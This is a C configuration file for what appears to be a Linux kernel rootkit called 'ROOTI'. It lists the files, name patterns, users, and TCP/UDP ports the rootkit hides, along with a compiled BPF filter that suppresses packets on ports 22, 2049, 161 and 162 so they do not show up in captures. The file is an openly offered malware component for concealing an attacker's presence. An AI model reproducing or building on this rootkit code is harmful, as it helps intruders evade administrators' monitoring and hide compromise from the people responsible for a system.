#include "config.h"

/*
    Unfortunately the linux kernel ARRAY_SIZE macro cannot be used to assign the result of the calculation
    to a constant variable because the linux macro includes some magic __must_be_array() term to catch invalid use
    of the macro, thus making the expression not constant.
*/
#define CONST_ARRAY_SIZE(ARR) sizeof(ARR) / sizeof(ARR[0])
#define DECLARE_ARRAY_SIZE(ARR) const size_t ARR##_COUNT = CONST_ARRAY_SIZE(ARR)

const char *ROOTI_HIDDEN_FILES[] = {"hideme.txt", "dontshowme.txt"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES);

const char *ROOTI_HIDDEN_FILES_PREFIXES[] = {"secret_", "classified_"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_PREFIXES);

const char *ROOTI_HIDDEN_FILES_SUFFIXES[] = {"_secret.txt", "_classified.txt"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_FILES_SUFFIXES);

const char *ROOTI_HIDDEN_USERS[] = {"omri", "omre"};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_USERS);

const unsigned short ROOTI_HIDDEN_TCP_PORTS[] = {22, 2049};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_TCP_PORTS);

const unsigned short ROOTI_HIDDEN_UDP_PORTS[] = {161, 162};
DECLARE_ARRAY_SIZE(ROOTI_HIDDEN_UDP_PORTS);

// 'not ((tcp and (port 22 or port 2049)) or (udp and (port 161 or port 162)))'
struct sock_filter ROOTI_BPF_FILTER_PROGRAM[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 19, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 0, 8, 0x00000006 },
    { 0x28, 0, 0, 0x00000014 },
    { 0x45, 33, 0, 0x00001fff },
    { 0xb1, 0, 0, 0x0000000e },
    { 0x48, 0, 0, 0x0000000e },
    { 0x15, 29, 0, 0x00000016 },
    { 0x15, 28, 0, 0x00000801 },
    { 0x48, 0, 0, 0x00000010 },
    { 0x15, 26, 17, 0x00000016 },
    { 0x15, 0, 26, 0x00000011 },
    { 0x28, 0, 0, 0x00000014 },
    { 0x45, 24, 0, 0x00001fff },
    { 0xb1, 0, 0, 0x0000000e },
    { 0x48, 0, 0, 0x0000000e },
    { 0x15, 20, 0, 0x000000a1 },
    { 0x15, 19, 0, 0x000000a2 },
    { 0x48, 0, 0, 0x00000010 },
    { 0x15, 17, 16, 0x000000a1 },
    { 0x15, 0, 17, 0x000086dd },
    { 0x30, 0, 0, 0x00000014 },
    { 0x15, 0, 6, 0x00000006 },
    { 0x28, 0, 0, 0x00000036 },
    { 0x15, 12, 0, 0x00000016 },
    { 0x15, 11, 0, 0x00000801 },
    { 0x28, 0, 0, 0x00000038 },
    { 0x15, 9, 0, 0x00000016 },
    { 0x15, 8, 9, 0x00000801 },
    { 0x15, 8, 0, 0x0000002c },
    { 0x15, 0, 7, 0x00000011 },
    { 0x28, 0, 0, 0x00000036 },
    { 0x15, 4, 0, 0x000000a1 },
    { 0x15, 3, 0, 0x000000a2 },
    { 0x28, 0, 0, 0x00000038 },
    { 0x15, 1, 0, 0x000000a1 },
    { 0x15, 0, 1, 0x000000a2 },
    { 0x6, 0, 0, 0x00000000 },
    { 0x6, 0, 0, 0x00040000 },
};
DECLARE_ARRAY_SIZE(ROOTI_BPF_FILTER_PROGRAM);
